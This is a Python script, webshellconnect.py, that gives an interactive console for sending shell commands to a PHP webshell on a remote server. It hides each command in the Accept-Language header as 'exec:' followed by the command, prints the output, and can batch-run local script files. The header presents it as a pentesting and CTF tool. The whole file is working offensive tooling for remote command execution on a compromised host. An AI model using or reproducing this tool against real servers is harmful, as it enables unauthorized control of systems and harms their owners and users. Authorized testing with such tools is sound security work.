#!/usr/bin/python3

# 
# webshellconnect.py
# Project page: github.com/jubal-R/webshell
# Interactive console to run commands through php webshell.
# For use in pentesting, CTFs, etc.
# 

import urllib.request, sys, http.client, os.path
from urllib.request import Request

def openurl(url, cmd):
	try:
		request = Request("http://" + url)
		request.add_header("Accept-Language", "exec:"+cmd)

		response = urllib.request.urlopen(request)

		if (response.getcode() == 200):
			return response.read().decode("utf-8")

	except (urllib.request.URLError, http.client.InvalidURL, UnicodeError):
		print("Connection to " + url + " failed.")
		return ""

def parseResponse(response):
	return response.replace("<br>", "\n")

# Replace new lines with semi-colons
def parseScript(script):
	return script.replace("\n", "&")


# 
# Main
# 
def main(argv):
	if (len(argv) >= 2):
		# Get URL From Arg
		url = argv[1]

		print("Sending commands to " + url+"\n")

		command = ""
		
		while (command != "exit"):
			# Prompt User For Command
			command = input("$ ")
			
			if(command != "exit"):
			
				# Check if user wants to run script
				if (command[:4] == 'run '):
					# Script filename
					script = command[4:]
					
					# Check if script is in scripts directory
					if (os.path.exists('scripts/' + script)):
						scriptFile = open('scripts/'+ script, 'r')

						# Set command to contents of script file
						command = parseScript(scriptFile.read())
						scriptFile.close()
					else:
						print(script + ' not found.')
				
				# Send Request
				response = openurl(url, command)
				# Parse Response
				response = parseResponse(response)
				# Print Response
				print(response)
	else:
		man = """
		webshellconnect.py - Connect To PHP Webshell

		Usage: ./webshellconnect.py [url]

		Example: ./webshellconnect.py 192.168.56.104/webshell.php
			"""
		print(man)

if __name__ == "__main__":
    main(sys.argv)
